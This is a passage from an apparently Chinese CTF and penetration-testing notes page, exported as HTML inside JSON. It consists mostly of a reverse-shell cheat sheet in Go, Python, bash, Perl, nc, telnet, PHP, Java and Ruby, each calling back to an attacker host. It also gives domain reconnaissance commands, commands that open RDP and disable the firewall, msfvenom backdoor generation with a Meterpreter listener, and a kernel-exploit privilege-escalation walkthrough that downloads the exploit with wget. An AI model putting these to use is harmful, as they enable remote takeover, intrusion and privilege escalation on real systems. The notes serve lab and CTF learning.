data-num=\"5\"></td><td><pre>export SHELL<span class=\"token operator\">=</span>bash</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>export TERM<span class=\"token operator\">=</span>xterm<span class=\"token operator\">-</span>256color <span class=\"token comment\">#允许 clear，并且有颜色</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>键入 Ctrl<span class=\"token operator\">-</span>z 以将 shell 发送到后台</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>设置 shell 以通过反向 shell 发送控制字符和其他原始输入 </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>stty raw <span class=\"token operator\">-</span>echo<span class=\"token punctuation\">;</span>fg</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>回车一次后输入 reset 再回车将再次进入 shell 中</pre></td></tr></table></figure><h1 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h1>\n<p><code>反向shell：目标系统监听本地端口，攻击者连接目标系统的ip地址和开放端口</code></p>\n<p><code>反弹shell：攻击者监听本地端口，目标系统连接攻击者</code></p>\n<p><strong>Golang</strong></p>\n<pre><code class=\"language-GO\">package main\n\nimport (\n\t&quot;io&quot;\n\t&quot;io/ioutil&quot;\n\t&quot;log&quot;\n\t&quot;net&quot;\n\t&quot;os/exec&quot;\n)\n\nfunc main() &#123;\n\taddr := &quot;8.136.126.171:10001&quot;\n\tconn, err := net.Dial(&quot;tcp&quot;, addr)\n\tif err != nil &#123;\n\t\tlog.Fatal(err)\n\t&#125;\n\n\tbuf := make([]byte, 10240)\n\tn, err := conn.Read(buf)\n\tif err != nil &amp;&amp; err != io.EOF &#123;\n\t\tlog.Fatal(err)\n\t&#125;\n\n\tcmd_str := string(buf[:n])\n\tcmd := exec.Command(&quot;/bin/bash&quot;, &quot;-c&quot;, cmd_str)\n\tstdout, err := cmd.StdoutPipe()\n\tif err != nil &#123;\n\t\tlog.Fatal(err)\n\t&#125;\n\n\tdefer stdout.Close()\n\tif err := cmd.Start(); err != nil &#123;\n\t\tlog.Fatal(err)\n\t&#125;\n\n\topBytes, err := ioutil.ReadAll(stdout)\n\tif err != nil &#123;\n\t\tlog.Fatal(err)\n\t&#125;\n\n\tconn.Write([]byte(opBytes))\n&#125;\n</code></pre>\n<p><strong>python</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token operator\">-</span>c <span class=\"token string\">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.200.131\",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token operator\">-</span>c <span class=\"token string\">\"exec(\\\"import socket, subprocess;s = socket.socket();s.connect(('10.0.0.1',1234))\\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\\")\"</span></pre></td></tr></table></figure><p><strong>bash</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/10.0.0.1/8080 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span></pre></td></tr></table></figure><p><strong>Perl</strong></p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>perl <span class=\"token operator\">-e</span> <span class=\"token string\">'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\">&amp;S\");open(STDOUT,\">&amp;S\");open(STDERR,\">&amp;S\");exec(\"/bin/sh -i\");&#125;;'</span></pre></td></tr></table></figure><p>升级版</p>\n<figure class=\"highlight perl\"><figcaption data-lang=\"perl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>perl <span class=\"token operator\">-</span>MIO <span class=\"token operator\">-e</span> <span class=\"token string\">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.0.0.1:1234\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while&lt;>;'</span></pre></td></tr></table></figure><p><strong>nc</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-e</span> /bin/sh <span class=\"token number\">10.0</span>.0.1 <span class=\"token number\">1234</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>版本问题或不支持-e可使用：</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">rm</span> /tmp/f<span class=\"token punctuation\">;</span><span class=\"token function\">mkfifo</span> /tmp/f<span class=\"token punctuation\">;</span><span class=\"token function\">cat</span> /tmp/f<span class=\"token operator\">|</span>/bin/sh <span class=\"token parameter variable\">-i</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span><span class=\"token file-descriptor important\">&amp;1</span><span class=\"token operator\">|</span><span class=\"token function\">nc</span> <span class=\"token number\">10.0</span>.0.1 <span class=\"token number\">1234</span> <span class=\"token operator\">></span>/tmp/f</pre></td></tr></table></figure><p><strong>Telnet</strong></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mknod</span> backpipe p <span class=\"token operator\">&amp;&amp;</span> telnet <span class=\"token number\">10.0</span>.0.1 <span class=\"token number\">1234</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>&lt;</span>backpipe <span class=\"token operator\">|</span> /bin/bash <span class=\"token operator\"><span class=\"token file-descriptor important\">1</span>></span>backpipe</pre></td></tr></table></figure><p><strong>php</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php <span class=\"token operator\">-</span>r <span class=\"token string single-quoted-string\">'$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3\");'</span></pre></td></tr></table></figure><p><strong>java</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>r <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"/bin/bash\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"exec 5&lt;>/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2>&amp;5 >&amp;5; done\"</span><span class=\"token punctuation\">]</span> as <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">waitFor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>Ruby</strong></p>\n<figure class=\"highlight ruby\"><figcaption data-lang=\"ruby\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ruby <span class=\"token operator\">-</span>rsocket <span class=\"token operator\">-</span>e<span class=\"token string-literal\"><span class=\"token string\">'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d\",f,f,f)'</span></span></pre></td></tr></table></figure><p>不依赖于 /bin/sh 的 shell：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ruby <span class=\"token parameter variable\">-rsocket</span> <span class=\"token parameter variable\">-e</span> <span class=\"token string\">'exit if fork;c=TCPSocket.new(\"10.0.0.1\",\"1234\");while(cmd=c.gets);IO.popen(cmd,\"r\")&#123;|io|c.print io.read&#125;end'</span></pre></td></tr></table></figure><p>如果目标系统运行 Windows：</p>\n<figure class=\"highlight ruby\"><figcaption data-lang=\"ruby\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ruby <span class=\"token operator\">-</span>rsocket <span class=\"token operator\">-</span>e <span class=\"token string-literal\"><span class=\"token string\">'c=TCPSocket.new(\"10.0.0.1\",\"1234\");while(cmd=c.gets);IO.popen(cmd,\"r\")&#123;|io|c.print io.read&#125;end'</span></span></pre></td></tr></table></figure><h1 id=\"内网\"><a class=\"anchor\" href=\"#内网\">#</a> 内网</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly95aW53Yy5naXRodWIuaW8vMjAxOS8wOC8xNC8lRTUlODYlODUlRTclQkQlOTElRTYlQjglOTclRTklODAlOEYlRTQlQjglOEUlRTUlOTAlOEUlRTYlQjglOTclRTklODAlOEYvIw==\">内网渗透到后渗透的基本思路</span></p>\n<p>手把手教你入门内网渗透之一 https://www.anquanke.com/post/id/221264</p>\n<p>Vulnstack 红日安全内网靶场 [一] _https://www.cnblogs.com/1vxyz/p/17201316.html</p>\n<h2 id=\"域内信息收集\"><a class=\"anchor\" href=\"#域内信息收集\">#</a> 域内信息收集</h2>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>shell ipconfig /all      <span class=\"token comment\">#查看 DNS 服务器，主 DNS 后缀是否为空，是否存在域</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>shell net view                 <span class=\"token comment\"># 查看局域网内其他主机名</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>net config Workstation   <span class=\"token comment\"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>net user                 <span class=\"token comment\"># 查看本机用户列表</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>net user /domain         <span class=\"token comment\"># 查看域用户</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>net localgroup administrators <span class=\"token comment\"># 查看本地管理员组（通常会有域用户）</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>net view /domain         <span class=\"token comment\"># 查看有几个域</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>net user 用户名 /domain   <span class=\"token comment\"># 获取指定域用户的信息</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>net group /domain        <span class=\"token comment\"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>net group 组名 /domain    <span class=\"token comment\"># 查看域中某工作组</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>net group <span class=\"token string\">\"domain admins\"</span> /domain  <span class=\"token comment\"># 查看域管理员的名字</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>net group <span class=\"token string\">\"domain computers\"</span> /domain  <span class=\"token comment\"># 查看域中的其他主机名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>net group <span class=\"token string\">\"doamin controllers\"</span> /domain  <span class=\"token comment\"># 查看域控制器主机名（可能有多台）</span></pre></td></tr></table></figure><h2 id=\"远程登录\"><a class=\"anchor\" href=\"#远程登录\">#</a> 远程登录</h2>\n<p>Windows：win+R—— <code>mstsc /console</code></p>\n<h3 id=\"win7\"><a class=\"anchor\" href=\"#win7\">#</a> win7</h3>\n<p>跳板机默认不开启 3389 端口，同时还有防火墙</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#注册表开启 3389 端口</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>REG ADD HKLM<span class=\"token punctuation\">\\</span>SYSTEM<span class=\"token punctuation\">\\</span>CurrentControlSet<span class=\"token punctuation\">\\</span>Control<span class=\"token punctuation\">\\</span>Terminal<span class=\"token string\">\" \"</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#添加防火墙规则</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>netsh advfirewall firewall <span class=\"token function\">add</span> rule <span class=\"token assign-left variable\">name</span><span class=\"token operator\">=</span><span class=\"token string\">\"Open 3389\"</span> <span class=\"token assign-left variable\">dir</span><span class=\"token operator\">=</span>in <span class=\"token assign-left variable\">action</span><span class=\"token operator\">=</span>allow <span class=\"token assign-left variable\">protocol</span><span class=\"token operator\">=</span>TCP <span class=\"token assign-left variable\">localport</span><span class=\"token operator\">=</span><span class=\"token number\">3389</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#关闭防火墙</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>netsh firewall <span class=\"token builtin class-name\">set</span> opmode disable   \t\t\t<span class=\"token comment\">#winsows server 2003 之前</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>netsh advfirewall <span class=\"token builtin class-name\">set</span> allprofiles state off \t<span class=\"token comment\">#winsows server 2003 之后</span></pre></td></tr></table></figure><h2 id=\"msf联动cs\"><a class=\"anchor\" href=\"#msf联动cs\">#</a> MSF 联动 CS</h2>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>msfconsole <span class=\"token comment\"># 启动 MSF 框架，开启监听</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use exploit/multi/handler</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_http</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.236.128</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">1111</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>exploit</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 获取 session</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># kali 生成 msf 后门文件 shell.exe，蚁剑上传到 win7 上</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>msfvenom <span class=\"token parameter variable\">-p</span> windows/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.236.128  <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">1111</span> <span class=\"token parameter variable\">-f</span> exe <span class=\"token parameter variable\">-o</span> shell.exe </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># kali 里运行监听</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_tcp</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.236.128</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">1111</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>exploit </pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>蚁剑运行 shell.exe 得到meterpreter</pre></td></tr></table></figure><h1 id=\"内核提权\"><a class=\"anchor\" href=\"#内核提权\">#</a> 内核提权</h1>\n<h2 id=\"linux\"><a class=\"anchor\" href=\"#linux\">#</a> Linux</h2>\n<p><code>www-data是低特权用户，需要提升到root权限，cd /tmp 进入tmp目录， uname -a 根据linux版本提权</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82NTQwMTc2MzE=\">https://zhuanlan.zhihu.com/p/654017631</span></p>\n<ul>\n<li>\n<p>利用内核漏洞提权</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>searchsploit <span class=\"token number\">37292</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>cp <span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>share<span class=\"token operator\">/</span>exploitdb<span class=\"token operator\">/</span>exploits<span class=\"token operator\">/</span>linux<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span><span class=\"token number\">37292</span><span class=\"token punctuation\">.</span>c <span class=\"token operator\">/</span>home</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>探测目标系统  gcc <span class=\"token operator\">-</span>h：gcc安装?   which cc：cc有安装?</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>若无法进行GCC编译，需要改下脚本为cc</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>gedit <span class=\"token number\">37292</span><span class=\"token punctuation\">.</span>c，找到gcc，改为cc</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>攻击者创建网络服务 python3————python3 <span class=\"token operator\">-</span>m http<span class=\"token punctuation\">.</span>server <span class=\"token number\">8081</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>已连接目标系统shell用wget下载exp  wget http<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span><span class=\"token number\">192.168</span><span class=\"token number\">.200</span><span class=\"token number\">.131</span><span class=\"token punctuation\">:</span><span class=\"token number\">80881</span><span class=\"token operator\">/</span><span class=\"token number\">37292</span><span class=\"token punctuation\">.</span>c</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>编译 cc <span class=\"token number\">37292</span><span class=\"token punctuation\">.</span>c <span class=\"token operator\">-</span>o xxg </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>授权 chmod <span class=\"token operator\">+</span>x xxg</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>执行 <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>xxg</pre></td></tr></table></figure></li>\n<li>\n<p>利用 SUID 提权</p>\n</li>\n<li>\n<p>SUDO 提权</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>[sudo su]暂时申请root权限，输入当前用户的密码</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>[sudo -i]表示为了频繁的执行某些只有超级用户才能执行的权限，而不用每次输入密码，可以使用该命令。提示输入密码时该密码为当前账户的密码。没有时间限制。执行该命令后提示符变为“#”而不是“$”。想退回普通账户时可以执V 行“exit”或“logout” </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>[sudo !!]以root权限执行上一条命令。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>[sudo -u userb ls -l]指定用户执行命令。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>[sudo -l]列出目前的权限。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>[sudo -u uggc vi ~www/index.html]以 uggc 用户身份编辑 home 目录下www目录中的 index.html 文件</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>[sudo su] 切换root身份，不携带当前用户环境变量。</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>[sudo su -]切换root身份，携带当前用户环境变量。</pre></td></tr></table></figure></li>\n<li>\n<p>计划任务</p>\n</li>\n<li>\n<p>NFS 提权</p>\n</li>\n<li>\n<p>MySQL 提权： <code>sudo mysql -e ''</code></p>\n</li>\n</ul>\n",
            "tags": [
                "CTF",
                "CTF_Web"
            ]
        }
    ]
}